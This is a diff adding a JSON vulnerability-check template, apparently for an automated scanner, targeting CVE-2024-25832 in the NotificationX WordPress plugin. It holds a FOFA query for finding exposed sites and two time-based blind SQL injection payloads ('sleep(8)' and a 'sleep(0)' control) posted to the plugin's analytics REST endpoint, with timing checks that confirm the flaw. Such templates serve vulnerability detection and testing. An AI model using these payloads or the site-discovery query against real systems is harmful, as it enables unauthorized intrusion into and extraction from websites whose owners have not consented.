@@ -1,0 +1,72 @@
+{
+  "product": "WordPress",
+  "vul_name": "WordPress Plugin SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2024-25832"
+  ],
+  "level": 3,
+  "vul_desc": "WordPress Plugin是一个可以增强和扩展WordPress网站功能的软件，它是基于WordPress平台开发的。这些插件可以添加新的功能，改变网站外观，增强安全性等。一般来说，它们可以用来优化SEO、集成社交媒体、创建联系表单、生成缩略图、添加广告等等。该产品存在SQL注入漏洞。该漏洞源于对用户提供的参数转义不充分以及对现有 SQL 查询缺乏充分的准备，很容易通过“type”参数受到 SQL 注入攻击。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/wp-content/plugins/notificationx\""
+  },
+  "protocol": "http",
+  "link": "http://www.360doc.com/content/24/0318/19/67871819_1117603655.shtml",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/wp-json/notificationx/v1/analytics",
+        "json": {
+          "nx_id": "1",
+          "type": "clicks`=1 and 1=sleep(8)-- -"
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/wp-json/notificationx/v1/analytics",
+        "json": {
+          "nx_id": "1",
+          "type": "clicks`=1 and 1=sleep(0)-- -"
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
